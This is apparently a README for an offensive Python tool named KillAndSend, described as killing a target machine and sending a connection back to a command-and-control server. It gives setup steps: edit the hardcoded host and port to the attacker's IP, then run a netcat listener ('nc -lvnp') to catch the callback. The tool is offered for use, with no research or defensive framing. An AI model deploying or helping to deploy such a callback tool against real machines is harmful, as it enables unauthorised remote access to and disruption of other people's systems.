# KillAndSend
The python program for killing a machine and sending a connection back to C2 or command and control server

# Setting up
 open the file 
	root@liunx:# nano killandsend.py
		(or ant text editor)
on lines 
	6 host = "127.0.0.1"
	7 port = 8080

change the host and port 
	6 host = "Your_IP"
	7 port = port_number_for_nc

make sure to run netcat 
	nc -lvnp port_number_for_nc

# Usage
https://github.com/user-attachments/assets/9695dcf8-51f7-412c-8112-04c7b581296e
